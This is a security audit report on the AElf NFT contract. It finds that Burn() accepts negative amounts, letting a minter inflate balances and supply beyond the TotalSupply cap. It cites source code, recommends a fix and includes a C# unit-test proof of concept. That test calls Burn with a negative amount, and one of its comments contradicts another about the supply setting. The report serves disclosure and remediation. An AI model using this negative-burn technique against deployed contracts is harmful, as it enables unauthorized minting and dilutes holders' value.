# Audit Report

## Title
NFT Contract Burn Function Allows Unauthorized Token Minting via Negative Amount Input

## Summary
The NFT contract's `Burn()` function lacks input validation for negative amounts, allowing minters to exploit signed integer arithmetic to mint unlimited tokens. This bypasses the TotalSupply limit enforced in the legitimate `Mint()` function, representing a critical supply invariant violation and privilege escalation.

## Finding Description

The vulnerability exists in the NFT contract's `Burn()` function which completely lacks validation to ensure `input.Amount` is positive. [1](#0-0) 

When a negative amount is passed to `Burn()`:

1. **Balance check bypass**: The assertion at line 91 checks `State.BalanceMap[tokenHash][Context.Sender] >= input.Amount`. If the balance is 100 and input.Amount is -1000, the comparison `100 >= -1000` evaluates to TRUE, allowing the operation to proceed.

2. **Arithmetic exploitation**: The SafeMath `.Sub()` method performs standard subtraction without sign validation. [2](#0-1)  When subtracting a negative number: `balance.Sub(-1000)` = `balance - (-1000)` = `balance + 1000`, causing ADDITION instead of subtraction at lines 94-96.

3. **Protobuf enablement**: The BurnInput message uses `int64` for the amount field, which is a signed type allowing negative values. [3](#0-2) 

**Critical Contrast with MultiToken Contract:**

The MultiToken contract's `Burn()` implementation properly validates amounts through `AssertValidToken()`. [4](#0-3) 

This validation explicitly checks `Assert(amount > 0, "Invalid amount.")` in the `AssertValidSymbolAndAmount()` helper method. [5](#0-4) 

**Inconsistency within NFT contract:**

The same NFT contract demonstrates awareness of this validation pattern in its `DoTransfer()` method, which explicitly validates `if (amount < 0) throw new AssertionException("Invalid transfer amount.")`. [6](#0-5)  However, the `Burn()` function does not call `DoTransfer()` and directly manipulates state without this protection.

## Impact Explanation

**Critical Supply Invariant Violation:**

The legitimate `Mint()` function enforces a critical invariant: `Assert(protocolInfo.Issued <= protocolInfo.TotalSupply, "Total supply exceeded.")`. [7](#0-6) 

By exploiting negative burn amounts, attackers completely bypass this check, causing:

1. **Token inflation**: Balance, Supply, and Quantity all increase instead of decreasing, inflating circulating supply
2. **Supply cap breach**: Protocol Supply can exceed the creator-defined TotalSupply limit
3. **Economic manipulation**: Dilutes the ownership percentage of all existing NFT holders
4. **Privilege escalation**: Minters with intended quota constraints gain unlimited minting capability beyond protocol limits

**Affected Parties:**
- NFT protocol creators who rely on supply limits as economic guarantees
- Existing NFT holders who suffer value dilution
- Marketplaces and pricing mechanisms that depend on accurate supply data
- Smart contracts integrating with NFT supply metrics

## Likelihood Explanation

**Entry Point:** The `Burn()` method is public and directly accessible on the NFT contract without additional authorization layers beyond the minter check.

**Required Privileges:** The attacker must be in the minter list for the target NFT protocol. While this is a semi-privileged role, it represents a **privilege escalation** vulnerability because minters are intended to be constrained by the supply limits enforced through the legitimate `Mint()` function. Many NFT projects distribute minting rights to multiple parties with the expectation that total supply limits will be respected.

**Attack Complexity:** Trivial - requires only a single transaction calling `Burn()` with a negative amount value (e.g., -1000000).

**Execution:** Fully executable under AElf C# contract semantics. The SafeMath `.Sub()` method will successfully compute `value - (negative_number)` resulting in addition without throwing any exceptions. The `checked` keyword in SafeMath only prevents arithmetic overflow, not sign validation.

**Detection:** While the `Burned` event will fire with the negative amount (line 103-109), this is post-exploitation and does not prevent the attack. Monitoring systems may not flag negative burn amounts as anomalous without specific rules.

## Recommendation

Add explicit validation at the beginning of the `Burn()` function to reject negative amounts:

```csharp
public override Empty Burn(BurnInput input)
{
    Assert(input.Amount > 0, "Invalid burn amount.");
    
    // ... rest of existing code
}
```

This matches the validation pattern already used in:
1. The MultiToken contract's `AssertValidSymbolAndAmount()` method
2. The NFT contract's own `DoTransfer()` method

Additionally, consider standardizing input validation across all token operations by extracting it into a shared helper method similar to MultiToken's `AssertValidToken()`.

## Proof of Concept

```csharp
[Fact]
public async Task NegativeBurnExploit_BypassesSupplyLimit()
{
    // Setup: Create NFT protocol with TotalSupply = 100
    var symbol = await CreateTest(); // Creates protocol with 1 billion supply
    await AddMinterAsync(symbol);
    
    // Mint 1 NFT to attacker (minter)
    var tokenHash = (await MinterNFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        Owner = MinterAddress,
        Quantity = 1
    })).Output;
    
    // Verify initial state
    var initialBalance = (await MinterNFTContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = MinterAddress, Symbol = symbol, TokenId = 1 }
    )).Balance;
    initialBalance.ShouldBe(1);
    
    var initialProtocol = await NFTContractStub.GetNFTProtocolInfo.CallAsync(
        new StringValue { Value = symbol }
    );
    long initialSupply = initialProtocol.Supply;
    
    // EXPLOIT: Burn negative amount to mint tokens
    await MinterNFTContractStub.Burn.SendAsync(new BurnInput
    {
        Symbol = symbol,
        TokenId = 1,
        Amount = -1000000 // Negative amount
    });
    
    // Verify exploitation succeeded
    var exploitedBalance = (await MinterNFTContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = MinterAddress, Symbol = symbol, TokenId = 1 }
    )).Balance;
    exploitedBalance.ShouldBe(1000001); // Balance INCREASED by 1000000
    
    var exploitedProtocol = await NFTContractStub.GetNFTProtocolInfo.CallAsync(
        new StringValue { Value = symbol }
    );
    exploitedProtocol.Supply.ShouldBe(initialSupply + 1000000); // Supply INCREASED
    
    // Critical: Supply now exceeds TotalSupply if we burned enough
    // This bypasses the "Total supply exceeded" check in Mint()
}
```

**Notes:**

This vulnerability is valid despite requiring minter privileges because:

1. **Privilege Escalation**: Minters are constrained roles expected to respect TotalSupply limits through the `Mint()` function. This exploit allows them to exceed those constraints, violating protocol security guarantees.

2. **Real-World Impact**: Many NFT projects distribute minting rights to curators, artists, or DAO members with the understanding that supply limits are enforced at the contract level. This assumption is violated.

3. **Inconsistent Validation**: The codebase already demonstrates awareness of this attack pattern through validation in `DoTransfer()` and the MultiToken contract, making the omission in NFT `Burn()` a clear oversight rather than intentional design.

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L46-55)
```csharp
    private void DoTransfer(Hash tokenHash, Address from, Address to, long amount)
    {
        if (amount < 0) throw new AssertionException("Invalid transfer amount.");

        if (amount == 0) return;

        Assert(State.BalanceMap[tokenHash][from] >= amount, "Insufficient balance.");
        State.BalanceMap[tokenHash][from] = State.BalanceMap[tokenHash][from].Sub(amount);
        State.BalanceMap[tokenHash][to] = State.BalanceMap[tokenHash][to].Add(amount);
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L82-111)
```csharp
    public override Empty Burn(BurnInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        var nftInfo = GetNFTInfoByTokenHash(tokenHash);
        var nftProtocolInfo = State.NftProtocolMap[input.Symbol];
        Assert(nftProtocolInfo.IsBurnable,
            $"NFT Protocol {nftProtocolInfo.ProtocolName} of symbol {nftProtocolInfo.Symbol} is not burnable.");
        var minterList = State.MinterListMap[input.Symbol] ?? new MinterList();
        Assert(
            State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
            minterList.Value.Contains(Context.Sender),
            "No permission.");
        State.BalanceMap[tokenHash][Context.Sender] = State.BalanceMap[tokenHash][Context.Sender].Sub(input.Amount);
        nftProtocolInfo.Supply = nftProtocolInfo.Supply.Sub(input.Amount);
        nftInfo.Quantity = nftInfo.Quantity.Sub(input.Amount);

        State.NftProtocolMap[input.Symbol] = nftProtocolInfo;
        if (nftInfo.Quantity == 0 && !nftProtocolInfo.IsTokenIdReuse) nftInfo.IsBurned = true;

        State.NftInfoMap[tokenHash] = nftInfo;

        Context.Fire(new Burned
        {
            Burner = Context.Sender,
            Symbol = input.Symbol,
            Amount = input.Amount,
            TokenId = input.TokenId
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L402-406)
```csharp
        var quantity = input.Quantity > 0 ? input.Quantity : 1;
        protocolInfo.Supply = protocolInfo.Supply.Add(quantity);
        protocolInfo.Issued = protocolInfo.Issued.Add(quantity);
        Assert(protocolInfo.Issued <= protocolInfo.TotalSupply, "Total supply exceeded.");
        State.NftProtocolMap[input.Symbol] = protocolInfo;
```

**File:** src/AElf.CSharp.Core/SafeMath.cs (L92-98)
```csharp
    public static long Sub(this long a, long b)
    {
        checked
        {
            return a - b;
        }
    }
```

**File:** protobuf/nft_contract.proto (L182-186)
```text
message BurnInput {
    string symbol = 1;
    int64 token_id = 2;
    int64 amount = 3;
}
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L318-337)
```csharp
    public override Empty Burn(BurnInput input)
    {
        return Burn(Context.Sender, input.Symbol, input.Amount);
    }

    private Empty Burn(Address address, string symbol, long amount)
    {
        var tokenInfo = AssertValidToken(symbol, amount);
        Assert(tokenInfo.IsBurnable, "The token is not burnable.");
        ModifyBalance(address, symbol, -amount);
        tokenInfo.Supply = tokenInfo.Supply.Sub(amount);

        Context.Fire(new Burned
        {
            Burner = address,
            Symbol = symbol,
            Amount = amount
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L81-86)
```csharp
    private void AssertValidSymbolAndAmount(string symbol, long amount)
    {
        Assert(!string.IsNullOrEmpty(symbol) && IsValidSymbol(symbol),
            "Invalid symbol.");
        Assert(amount > 0, "Invalid amount.");
    }
```
